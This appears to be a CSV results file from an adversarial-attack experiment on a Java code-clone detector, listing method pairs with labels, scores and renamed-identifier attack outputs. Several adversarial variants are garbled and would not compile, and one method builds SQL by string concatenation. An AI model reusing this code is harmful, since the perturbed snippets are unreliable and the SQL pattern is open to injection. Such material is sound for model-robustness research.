",410,,LABEL_0,LABEL_0,LABEL_0,-1,"testNetworkHTTP,url,urlConnection,rd,line",,,,0,,0,GA,1997,0.7468761404355367,failed,[]
468,"    public String getPasswordMD5() {
        try {
            MessageDigest algorithm = MessageDigest.getInstance(""MD5"");
            algorithm.reset();
            algorithm.update(password.getBytes());
            byte messageDigest[] = algorithm.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException nsae) {
        }
        return null;
    }
 <SPLIT>     public static String md5String(String str) {
        try {
            MessageDigest md;
            md = MessageDigest.getInstance(""MD5"");
            md.update(str.getBytes());
            byte[] hash = md.digest();
            final char[] hexChars = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
            StringBuffer res = new StringBuffer();
            for (int i = 0; i < hash.length; i++) {
                res.append(hexChars[(0xF0 & hash[i]) >> 4]);
                res.append(hexChars[0x0F & hash[i]]);
            }
            return res.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return null;
        }
    }
",111,,LABEL_1,LABEL_1,LABEL_1,-1,"getPasswordMD5,algorithm,messageDigest,hexString,i",,,,0,,0,GA,1866,0.6627702037493388,failed,[]
469,"    private void copyFile(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",96,"    private void transferChannel(File url, File x) throws IOException {
        FileChannel iInChan= new FileInputStream(url).getChannel();
        FileChanneinConnectionel = new FileOutputStream(x).getChannel();
        try {
            InChan.transferTo(0, InChan.size(), inConnection);
        } catch (IOException e) {
            throw e;
        } finally {
            if (InChan != null) InChan.close();
            if (inConnection != null) inConnection.close();
        }
    }
",LABEL_1,LABEL_1,0.6855775713920593,1,"copyFile,in,out,inChannel,outChannel",,,,0,"copyFile:transferChannel,in:url,out:x,inChannel:InChan,outChannel:inConnection,",0,GA,335,0.12779948711395264,ga,[]
470,"    public String getPasswordMD5() {
        try {
            MessageDigest algorithm = MessageDigest.getInstance(""MD5"");
            algorithm.reset();
            algorithm.update(password.getBytes());
            byte messageDigest[] = algorithm.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException nsae) {
        }
        return null;
    }
 <SPLIT>     public static String mysqlPasswordHash(String string) {
        try {
            MessageDigest digest = MessageDigest.getInstance(HashAlgorithms.SHA1);
            try {
                digest.update(string.getBytes(""UTF-8""));
            } catch (UnsupportedEncodingException e) {
                throw new RuntimeException(e);
            }
            byte[] encodedPassword = digest.digest();
            digest.update(encodedPassword);
            encodedPassword = digest.digest();
            String hash = new BigInteger(1, encodedPassword).toString(16).toUpperCase();
            while (hash.length() < 40) {
                hash = ""0"" + hash;
            }
            return ""*"" + hash;
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }
",111,,LABEL_1,LABEL_1,LABEL_1,-1,"getPasswordMD5,algorithm,messageDigest,hexString,i",,,,0,,0,GA,1868,0.6622351845105489,failed,[]
471,"    protected BufferedImage handleFCLAException() {
        if (params.uri.startsWith(""http://image11.fcla.edu/cgi"")) try {
            params.uri = params.uri.substring(params.uri.indexOf(""q1="") + 3);
            params.uri = params.uri.substring(0, params.uri.indexOf(""&""));
            params.uri = ""http://image11.fcla.edu/m/map/thumb/"" + params.uri.substring(params.uri.length() - 3, params.uri.length() - 2) + ""/"" + params.uri.substring(params.uri.length() - 2, params.uri.length() - 1) + ""/"" + params.uri.substring(params.uri.length() - 1, params.uri.length()) + ""/"" + params.uri + "".jpg"";
            URL url = new URL(params.uri);
            URLConnection connection = url.openConnection();
            return processNewUri(connection);
        } catch (Exception e) {
        }
        return null;
    }
 <SPLIT>     public static void copyFile(File source, File dest) throws IOException {
        if (!dest.exists()) {
            dest.createNewFile();
        }
        FileChannel from = null;
        FileChannel to = null;
        try {
            from = new FileInputStream(source).getChannel();
            to = new FileOutputStream(dest).getChannel();
            to.transferFrom(from, 0, from.size());
        } finally {
            if (from != null) {
                from.close();
            }
            if (to != null) {
                to.close();
            }
        }
    }
",215,,LABEL_0,LABEL_0,LABEL_0,-1,"handleFCLAException,params,uri,url,connection",,,,0,,0,GA,1490,0.540985929965973,failed,[]
472,"    private void copyParseFileToCodeFile() throws IOException {
        InputStream in = new FileInputStream(new File(filenameParse));
        OutputStream out = new FileOutputStream(new File(filenameMisc));
        byte[] buffer = new byte[1024];
        int length;
        while ((length = in.read(buffer)) > 0) out.write(buffer, 0, length);
        in.close();
        out.close();
    }
 <SPLIT>     private void uploadFile() {
        String end = ""\r\n"";
        String twoHyphens = ""--"";
        String boundary = ""*****"";
        try {
            URL url = new URL(actionUrl);
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setDoInput(true);
            con.setDoOutput(true);
            con.setUseCaches(false);
            con.setRequestMethod(""POST"");
            con.setRequestProperty(""Connection"", ""Keep-Alive"");
            con.setRequestProperty(""Charset"", ""UTF-8"");
            con.setRequestProperty(""Content-Type"", ""multipart/form-data;boundary="" + boundary);
            DataOutputStream ds = new DataOutputStream(con.getOutputStream());
            ds.writeBytes(twoHyphens + boundary + end);
            ds.writeBytes(""Content-Disposition: form-data; "" + ""name=\""file1\"";filename=\"""" + newName + ""\"""" + end);
            ds.writeBytes(end);
            FileInputStream fStream = new FileInputStream(uploadFile);
            int bufferSize = 1024;
            byte[] buffer = new byte[bufferSize];
            int length = -1;
            while ((length = fStream.read(buffer)) != -1) {
                ds.write(buffer, 0, length);
            }
            ds.writeBytes(end);
            ds.writeBytes(twoHyphens + boundary + twoHyphens + end);
            fStream.close();
            ds.flush();
            InputStream is = con.getInputStream();
            int ch;
            StringBuffer b = new StringBuffer();
            while ((ch = is.read()) != -1) {
                b.append((char) ch);
            }
            showDialog(b.toString().trim());
            ds.close();
        } catch (Exception e) {
            showDialog("""" + e);
        }
    }
",89,,LABEL_0,LABEL_0,LABEL_0,-1,"copyParseFileToCodeFile,in,out,buffer,length",,,,0,,0,GA,1917,0.6889671007792155,failed,[]
473,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
 <SPLIT>     public static void main(String[] args) {
        String logFileName = args[0];
        int extractLineEvery = new Integer(args[1]).intValue();
        String filterToken = ""P0"";
        if (args.length > 2) {
            filterToken = args[2];
        }
        try {
            BufferedReader br = new BufferedReader(new FileReader(logFileName));
            BufferedWriter bw = new BufferedWriter(new FileWriter(new File(logFileName + "".trim"")));
            String readLine;
            int x = 0;
            while ((readLine = br.readLine()) != null) {
                if ((x++ % extractLineEvery == 0) && readLine.startsWith(filterToken)) {
                    bw.write(readLine + ""\n"");
                }
            }
            bw.flush();
            bw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
",272,"    private static void readAndRewwrite(File loginfile, File outFilename) throws IOException {
        ImageInputStream iis iIsImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(loginfile)));
        DcmParser d dpmPlugin= DcmParserFactory.getInstance().newDcmParser( iIs);
        Dataset s = DcmObjectFactory.getInstance().newDataset();
         dpmPlugin.setDcmHandler(s.getDcmHandler());
         dpmPlugin.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdhdStream pdFact.newReader(ds,siIs,  dpmPlugin.getDcmDecodeParam().byteOrder,  dpmPlugin.getReadVR());
        System.outurlintln(""reading "" + loginfile + ""..."");
        hdStream.readPixelData(false);
        ImageOutputStream out urlmageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFilename)));
        DcmEncodeParam dcmEncPar = DcmEncodeParam.IVR_LE;
        s.writeDataset(url, dcmEncPar);
        dssriteHeader(ouurldcdcmEncParTags.PixelData,  dpmPlugin.getReadVR(),  dpmPlugin.getReadLength());
        System.out.urlntln(""writing "" + outFilename + ""..."");
        PixelDataWriter pdsOutput= pdFact.newWriter(phdStreamgetPixelDataArray(), false, dssouurl dpmPlugin.getDcmDecodeParam().byteOrder,  dpmPlugin.getReadVR());
        dsOutput.writePixelData();
        url.flush();
        url.close();
        System.url.println(""done!"");
    }
",LABEL_1,LABEL_1,0.7368451952934265,1,"readAndRewrite,inFile,outFile,iis,dcmParser,ds,pdReader,out,dcmEncParam,pdWriter",,,,0,"readAndRewrite:readAndRewwrite,inFile:loginfile,outFile:outFilename,iis: iIs,dcmParser: dpmPlugin,ds:s,pdReader:hdStream,out:url,dcmEncParam:dcmEncPar,pdWriter:dsOutput,",0,GA,3056,1.118712572256724,ga,[]
474,"    public void execute() {
        try {
            if (methods == null) {
                return;
            }
            List<Resource> resources = new ArrayList<Resource>();
            for (Iterator<Resource> i = classFiles.iterator(); i.hasNext(); ) {
                final Resource classFile = i.next();
                if (!classFile.getName().equals(CALLSTACK_FILE)) {
                    try {
                        InputStream inputStream = classFile.getInputStream();
                        ClassReader reader = new ClassReader(inputStream);
                        reader.accept(new MethodAnalyzer(), 0);
                        resources.add(classFile);
                        oldSize += classFile.getSize();
                    } catch (IllegalStateException e) {
                    }
                }
            }
            for (Iterator<Resource> i = resources.iterator(); i.hasNext(); ) {
                final Resource classFile = i.next();
                try {
                    InputStream inputStream = classFile.getInputStream();
                    ClassReader reader = new ClassReader(inputStream);
                    ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_MAXS);
                    if (!classFile.getName().startsWith(CALLSTACK_FILE.substring(0, CALLSTACK_FILE.indexOf('.')))) {
                        reader.accept(new MethodInjector(writer), 0);
                        byte[] b = writer.toByteArray();
                        inputStream.close();
                        OutputStream outputStream = classFile.getOutputStream();
                        outputStream.write(b);
                        outputStream.close();
                        injectedClasses++;
                    }
                } catch (IllegalStateException e) {
                }
                newSize += classFile.getSize();
            }
            File classFile = new File(classFiles.getDir(), CALLSTACK_FILE);
            if (!classFile.exists()) {
                throw new BuildException(""Missing net.yura.mobile.logging.CallStack class"");
            }
            InputStream inputStream = new FileInputStream(classFile);
            ClassReader reader = new ClassReader(inputStream);
            ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_MAXS);
            try {
                reader.accept(new PushMethodGenerator(writer), 0);
            } finally {
                inputStream.close();
            }
            byte[] b = writer.toByteArray();
            inputStream.close();
            OutputStream outputStream = new FileOutputStream(classFile);
            outputStream.write(b);
            outputStream.close();
            log(injectedClasses + "" classes injected"");
            log((injectedMethods * 100) / Math.max(1, totalMethods) + ""% of methods injected"");
            log((100 - ((oldSize * 100) / newSize)) + ""% code size increase"");
        } catch (IOException e) {
            log(e, 0);
        }
    }
 <SPLIT>     public static boolean loadContentFromURL(String fromURL, String toFile) {
        try {
            URL url = new URL(""http://bible-desktop.com/xml"" + fromURL);
            File file = new File(toFile);
            URLConnection ucon = url.openConnection();
            InputStream is = ucon.getInputStream();
            BufferedInputStream bis = new BufferedInputStream(is);
            ByteArrayBuffer baf = new ByteArrayBuffer(50);
            int current = 0;
            while ((current = bis.read()) != -1) {
                baf.append((byte) current);
            }
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(baf.toByteArray());
            fos.close();
        } catch (IOException e) {
            Log.e(TAG, e);
            return false;
        }
        return true;
    }
",500,,LABEL_0,LABEL_1,,-4,"execute,resources,i,classFile,inputStream,reader,oldSize,writer,b,outputStream,injectedClasses,newSize",,,,0,,0,Greedy,1,0.0006978034973144532,,[]
475,"    public static String SHA1(String text) {
        byte[] sha1hash = new byte[40];
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(text.getBytes(""iso-8859-1""), 0, text.length());
            sha1hash = md.digest();
        } catch (UnsupportedEncodingException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        }
        return convertToHex(sha1hash);
    }
 <SPLIT>     private void getRandomGUID(boolean secure) {
        MessageDigest md5 = null;
        StringBuffer sbValueBeforeMD5 = new StringBuffer();
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            logger.error(""At RandomGUID !!!"", e);
        }
        try {
            long time = System.currentTimeMillis();
            long rand = 0;
            if (secure) {
                rand = mySecureRand.nextLong();
            } else {
                rand = myRand.nextLong();
            }
            sbValueBeforeMD5.append(s_id);
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(time));
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(rand));
            valueBeforeMD5 = sbValueBeforeMD5.toString();
            md5.update(valueBeforeMD5.getBytes());
            byte[] array = md5.digest();
            StringBuffer sb = new StringBuffer();
            for (int j = 0; j < array.length; ++j) {
                int b = array[j] & 0xFF;
                if (b < 0x10) sb.append('0');
                sb.append(Integer.toHexString(b));
            }
            valueAfterMD5 = sb.toString();
        } catch (Exception e) {
            logger.error(""At RandomGUID !!!"", e);
        }
    }
",135,,LABEL_1,LABEL_1,LABEL_1,-1,"SHA1,text,sha1hash,md",,,,0,,0,GA,1532,0.5509215354919433,failed,[]
476,"    public static String digest(String algorithm, String text) {
        MessageDigest mDigest = null;
        try {
            mDigest = MessageDigest.getInstance(algorithm);
            mDigest.update(text.getBytes(ENCODING));
        } catch (NoSuchAlgorithmException nsae) {
            _log.error(nsae, nsae);
        } catch (UnsupportedEncodingException uee) {
            _log.error(uee, uee);
        }
        byte[] raw = mDigest.digest();
        BASE64Encoder encoder = new BASE64Encoder();
        return encoder.encode(raw);
    }
 <SPLIT>     @Test
    public void testSpeedyShareUpload() throws Exception {
        request.setUrl(""http://www.speedyshare.com/upload.php"");
        request.setFile(""fileup0"", file);
        HttpResponse response = httpClient.execute(request);
        assertTrue(response.is2xxSuccess());
        assertTrue(response.getResponseHeaders().size() > 0);
        String body = IOUtils.toString(response.getResponseBody());
        assertTrue(body.contains(""Download link""));
        assertTrue(body.contains(""Delete password""));
        response.close();
    }
",102,,LABEL_0,LABEL_0,LABEL_0,-1,"digest,algorithm,text,mDigest,raw,encoder",,,,0,,0,GA,2240,0.7909906943639119,failed,[]
477,"    public void delete(String name) throws FidoDatabaseException, CannotDeleteSystemLinkException, ClassLinkTypeNotFoundException {
        try {
            Connection conn = null;
            Statement stmt = null;
            try {
                conn = fido.util.FidoDataSource.getConnection();
                conn.setAutoCommit(false);
                stmt = conn.createStatement();
                if (isSystemLink(stmt, name) == true) throw new CannotDeleteSystemLinkException(name);
                AdjectivePrepositionTable prepTable = new AdjectivePrepositionTable();
                prepTable.deleteLinkType(stmt, name);
                ObjectLinkTable objectLinkTable = new ObjectLinkTable();
                objectLinkTable.deleteLinkType(stmt, name);
                String sql = ""delete from ClassLinkTypes where LinkName = '"" + name + ""'"";
                stmt.executeUpdate(sql);
                conn.commit();
            } catch (SQLException e) {
                if (conn != null) conn.rollback();
                throw e;
            } finally {
                if (stmt != null) stmt.close();
                if (conn != null) conn.close();
            }
        } catch (SQLException e) {
            throw new FidoDatabaseException(e);
        }
    }
 <SPLIT>     public void execUpdate(String sqlStmts[]) throws SQLException {
        if (conn == null || conn.isClosed()) throw new SQLException(""The connection has not been established yet."");
        if (sqlStmts == null || sqlStmts.length == 0) throw new SQLException(""SQL-statement is null."");
        conn.setAutoCommit(false);
        try {
            for (int i = 0; i < sqlStmts.length; i++) {
                stmt = conn.createStatement();
                stmt.executeUpdate(sqlStmts[i]);
                logger.debug(sqlStmts[i]);
                stmt.close();
            }
            conn.commit();
        } catch (SQLException ex) {
            conn.rollback();
            throw ex;
        }
    }
",200,,LABEL_1,LABEL_1,LABEL_1,-1,"delete,name,CannotDeleteSystemLinkException,ClassLinkTypeNotFoundException,conn,stmt,prepTable,objectLinkTable,sql",,,,0,,0,GA,3203,1.1593353350957234,failed,[]
478,"    public String storeImage(InputStream inStream, String fileName, boolean resize) throws Exception {
        Calendar rightNow = Calendar.getInstance();
        String dayNamedFolderName = """" + rightNow.get(Calendar.YEAR) + StringUtil.getPaddedIntWithZeros(2, rightNow.get(Calendar.MONTH) + 1) + StringUtil.getPaddedIntWithZeros(2, rightNow.get(Calendar.DATE));
        String uploadDirRoot = props.getProperty(""uploaded.files.root"");
        File file = new File(uploadDirRoot + System.getProperty(""file.separator"") + dayNamedFolderName);
        if (!file.exists()) file.mkdirs();
        String extension = FilenameUtils.getExtension(fileName);
        String outFileName;
        if (Boolean.parseBoolean(props.getPropertiesInstance().getProperty(IFConsts.USEORIGINALFILENAME, ""true""))) {
            outFileName = StringUtil.removeSpecChars(StringUtil.unaccent(FilenameUtils.getBaseName(fileName)));
        } else {
            outFileName = StringUtil.hash(fileName + Long.toString(System.currentTimeMillis()));
        }
        if (Boolean.parseBoolean(props.getPropertiesInstance().getProperty(IFConsts.USEEXTENSION, ""true""))) {
            outFileName = outFileName + DOT + extension;
        }
        String outPathAndName = uploadDirRoot + System.getProperty(""file.separator"") + dayNamedFolderName + System.getProperty(""file.separator"") + props.getProperty(""uploaded.files.prefix"") + outFileName;
        File uploadedFile = new File(outPathAndName);
        _logger.info(""uploadedFile.getAbsolutePath() = {}"", uploadedFile.getAbsolutePath());
        uploadedFile.createNewFile();
        OutputStream outStream = new FileOutputStream(outPathAndName);
        IOUtils.copyLarge(inStream, outStream);
        IOUtils.closeQuietly(inStream);
        outStream.close();
        if (resize) {
            writeResizedImage(outPathAndName, extension, ""imgSize_xs"");
            writeResizedImage(outPathAndName, extension, ""imgSize_s"");
            writeResizedImage(outPathAndName, extension, ""imgSize_m"");
            writeResizedImage(outPathAndName, extension, ""imgSize_l"");
            writeResizedImage(outPathAndName, extension, ""imgSize_xl"");
        }
        String retVal = dayNamedFolderName + ""/"" + props.getProperty(""uploaded.files.prefix"") + outFileName;
        return retVal;
    }
 <SPLIT>     public static Collection<Tuple<String, ArrayList<String>>> readGeoParserResult(String recordContent, boolean getGazeteerIds) {
        if (TESTING) {
            HashSet<Tuple<String, ArrayList<String>>> ret = new HashSet<Tuple<String, ArrayList<String>>>();
            ret.add(new Tuple<String, ArrayList<String>>(""teste"", new ArrayList<String>()));
            return ret;
        }
        int retries = 0;
        while (retries < 3) {
            try {
                ArrayList<Tuple<String, ArrayList<String>>> ret = new ArrayList<Tuple<String, ArrayList<String>>>();
                String reqPre = ""<?xml version=\""1.0\""?>\r\n"" + (getGazeteerIds ? ""<GetFeature"" : ""<GetParsing"") + "" xmlns=\""http://www.opengis.net/gp\"" xmlns:wfs=\""http://www.opengis.net/wfs\"""" + "" xmlns:xsi=\""http://www.w3.org/2000/10/XMLSchema-instance\"""" + "" xsi:schemaLocation=\""http://www.opengis.net/gp ../gp/GetFeatureRequest.xsd http://www.opengis.net/wfs ../wfs/GetFeatureRequest.xsd\""\r\n"" + "" wfs:outputFormat=\""GML2\"">"" + ""<wfs:Query wfs:TypeName=\""PlaceName\"" />"" + ""<Resource mine=\""text/plain\"">"" + ""<Contents></Contents>"" + ""</Resource>"" + (getGazeteerIds ? ""</GetFeature>"" : ""</GetParsing>"");
                Document doc = DocumentHelper.parseText(reqPre);
                doc.getRootElement().element(""Resource"").element(""Contents"").setText(recordContent);
                URL url = new URL(geoParserBaseUrl + ""?request="" + URLEncoder.encode(doc.asXML(), ""ISO8859-1""));
                InputStreamReader reader = new InputStreamReader(url.openStream(), ""UTF-8"");
                BufferedReader buffered = new BufferedReader(reader);
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = buffered.readLine()) != null) {
                    sb.append(line);
                }
                Document d = DocumentHelper.parseText(sb.toString());
                HashSet<String> places = new HashSet<String>();
                for (Iterator<Element> it = d.getRootElement().element(""EntryCollection"").elementIterator(""PlaceName""); it.hasNext(); ) {
                    Element plcEl = it.next();
                    String val = plcEl.elementTextTrim(""TermName"");
                    if (!val.equals("""") && !places.contains(val)) {
                        places.add(val);
                        String entryID = plcEl.attributeValue(""entryID"");
                        Tuple<String, ArrayList<String>> plc = new Tuple<String, ArrayList<String>>(val, new ArrayList<String>());
                        for (Iterator<Element> it2 = d.getRootElement().element(""EntryCollection"").elementIterator(""GazetteerEntry""); it2.hasNext(); ) {
                            Element idEl = it2.next();
                            if (idEl.attributeValue(""entryID"").equals(entryID)) plc.getV2().add(idEl.attributeValue(""id""));
                        }
                        ret.add(plc);
                    }
                }
                return ret;
            } catch (Exception e) {
                log.debug(""Erro ao pesquisar a lista de termos para o registo "" + recordContent + ""! "" + e.getMessage(), e);
                System.out.println(""Erro ao pesquisar a lista de termos para o registo "" + recordContent + ""! "" + e.getMessage());
                retries++;
            }
        }
        System.out.println(""Too many retries. Giving up."");
        return new HashSet<Tuple<String, ArrayList<String>>>();
    }
",419,,LABEL_0,LABEL_1,,-4,"storeImage,inStream,fileName,resize,rightNow,dayNamedFolderName,uploadDirRoot,file,extension,outFileName,outPathAndName,uploadedFile,outStream",,,,0,,0,Greedy,1,0.000836944580078125,,[]
479,"    public static void main(String[] args) throws FileNotFoundException {
        if (args.length < 2) throw new IllegalArgumentException();
        String fnOut = args[args.length - 1];
        PrintWriter writer = new PrintWriter(fnOut);
        for (int i = 0; i < args.length - 1; i++) {
            File fInput = new File(args[i]);
            Scanner in = new Scanner(fInput);
            while (in.hasNext()) {
                writer.println(in.nextLine());
            }
        }
        writer.close();
    }
 <SPLIT>     public static void copy(File from_file, File to_file) throws IOException {
        if (!from_file.exists()) abort(""FileCopy: no such source file: "" + from_file.getName());
        if (!from_file.isFile()) abort(""FileCopy: can't copy directory: "" + from_file.getName());
        if (!from_file.canRead()) abort(""FileCopy: source file is unreadable: "" + from_file.getName());
        if (to_file.isDirectory()) to_file = new File(to_file, from_file.getName());
        if (to_file.exists()) {
            if (!to_file.canWrite()) abort(""FileCopy: destination file is unwriteable: "" + to_file.getName());
        } else {
            String parent = to_file.getParent();
            if (parent == null) parent = System.getProperty(""user.dir"");
            File dir = new File(parent);
            if (!dir.exists()) abort(""FileCopy: destination directory doesn't exist: "" + parent);
            if (dir.isFile()) abort(""FileCopy: destination is not a directory: "" + parent);
            if (!dir.canWrite()) abort(""FileCopy: destination directory is unwriteable: "" + parent);
        }
        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(from_file);
            to = new FileOutputStream(to_file);
            byte[] buffer = new byte[4096];
            int bytes_read;
            while ((bytes_read = from.read(buffer)) != -1) {
                to.write(buffer, 0, bytes_read);
            }
        } finally {
            if (from != null) try {
                from.close();
            } catch (IOException e) {
                ;
            }
            if (to != null) try {
                to.close();
            } catch (IOException e) {
            }
        }
    }
",118,,LABEL_1,LABEL_1,LABEL_1,-1,"fnOut,writer,i,fInput,in",,,,0,,0,GA,1810,0.6562870462735494,failed,[]
480,"    public Vector parse(String link) {
        addMessage(""Parsing: "" + link);
        links.removeAllElements();
        URLConnection conn = null;
        Reader rd = null;
        EditorKit kit = new HTMLEditorKit();
        Document doc = kit.createDefaultDocument();
        doc.putProperty(""IgnoreCharsetDirective"", Boolean.TRUE);
        URL url = null;
        try {
            url = new URL(link);
        } catch (MalformedURLException err) {
            System.out.println(""Malformed URL"");
            return links;
        }
        try {
            conn = new URL(link).openConnection();
            rd = new InputStreamReader(conn.getInputStream());
        } catch (Exception err) {
            err.printStackTrace();
            return links;
        }
        try {
            kit.read(rd, doc, 0);
            ElementIterator it = new ElementIterator(doc);
            javax.swing.text.Element elem;
            while ((elem = it.next()) != null) {
                SimpleAttributeSet s = (SimpleAttributeSet) elem.getAttributes().getAttribute(HTML.Tag.A);
                if (s != null) {
                    if (s.toString().indexOf(""script"") >= 0) continue;
                    String lnk = """";
                    try {
                        lnk = s.getAttribute(HTML.Attribute.HREF).toString();
                    } catch (Exception err) {
                        continue;
                    }
                    int j = 0;
                    if ((j = lnk.indexOf('#')) >= 0) lnk = lnk.substring(0, j);
                    URL urlLink = new URL(url, lnk);
                    if (!url.getHost().equals(urlLink.getHost())) continue;
                    String str = urlLink.toString();
                    if (!str.startsWith(""http"")) continue;
                    if (str.endsWith("".pdf"")) {
                        continue;
                    }
                    for (int i = 0; i < leaveSuffix.length; i++) {
                        if ((str.endsWith(leaveSuffix[i]))) continue;
                    }
                    boolean skip = false;
                    for (int i = 0; i < suffix.length; i++) {
                        if ((str.endsWith(suffix[i]))) skip = true;
                    }
                    if (!skip) {
                        try {
                            conn = urlLink.openConnection();
                        } catch (Exception err) {
                        }
                        String contentType = null;
                        if (contentType == null) contentType = conn.getContentType();
                        if (contentType.equals(""application/pdf"")) {
                            continue;
                        } else if (!contentType.equals(""text/html"")) {
                            continue;
                        }
                    }
                    if (!links.contains(urlLink.toString())) {
                        links.addElement(urlLink.toString());
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return links;
    }
 <SPLIT>     private void createJCoPluginProject(IProgressMonitor monitor, String sourceFileName, String pluginName) throws CoreException, IOException {
        monitor.subTask(MessageFormat.format(Messages.ProjectGenerator_CreatePluginTaskDescription, pluginName));
        final Map<String, byte[]> files = readArchiveFile(sourceFileName);
        monitor.worked(10);
        IProject project = workspaceRoot.getProject(pluginName);
        if (project.exists()) {
            project.delete(true, true, new SubProgressMonitor(monitor, 5));
        } else {
            monitor.worked(5);
        }
        project.create(new SubProgressMonitor(monitor, 5));
        project.open(new SubProgressMonitor(monitor, 5));
        IProjectDescription description = project.getDescription();
